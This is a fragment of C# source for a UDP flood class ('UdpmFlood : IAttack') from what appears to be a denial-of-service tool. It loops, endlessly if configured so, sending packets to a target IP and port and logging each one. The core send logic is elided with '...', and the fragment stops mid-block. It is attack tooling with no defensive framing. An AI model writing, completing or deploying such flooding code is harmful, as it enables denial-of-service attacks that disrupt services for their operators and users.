...
{
    public class UdpmFlood : IAttack
    {
        public void StartFlood(string target, int packetCount, int speed, string message)
        {
            ...
            Console.WriteLine($"[UDP] Attacking {ip}:{port} | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms | Message: {message}");
            ...
            using (UdpClient udpClient = new UdpClient()) 
            {
                while (packetCount == -1 || count < packetCount)
                {
                    try
                    {
                        ...
                        success++;
                        Console.WriteLine($"[UDP] Packet {count + 1} sent to {ip}:{port} | Message: {message}");
                    }
                    catch
                    {
                        failed++;
                        Console.WriteLine($"[UDP] Packet {count + 1} FAILED!");
                    }
